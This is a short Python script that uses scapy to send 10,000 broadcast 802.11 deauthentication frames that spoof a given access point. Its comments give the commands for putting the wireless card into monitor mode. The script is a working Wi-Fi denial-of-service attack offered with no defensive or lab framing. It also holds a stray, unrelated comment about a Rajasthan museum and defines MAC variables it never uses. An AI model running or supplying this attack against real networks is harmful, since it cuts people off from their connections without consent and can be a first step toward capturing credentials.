# Deauth wifi

# $ sudo ifconfig wlan0 down
# $ sudo iwconfig wlan0 mode monitor

# Arna Jharna:The Thar Desert Museum of Rajasthan

from scapy.all import *
import sys

target_mac = "aa:aa:aa:aa:aa:aa"
gateway_mac = "Bb:bB:bb:bb:bb:bb"
broadcast_mac = "ff:ff:ff:ff:ff:ff"

# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC

packet = RadioTap() / Dot11(addr1=broadcast_mac, addr2=sys.argv[1], addr3=sys.argv[1]) / Dot11Deauth()

# send the packet
sendp(packet, inter=0.2, count=10000, iface="wlp2s0mon", verbose=1)



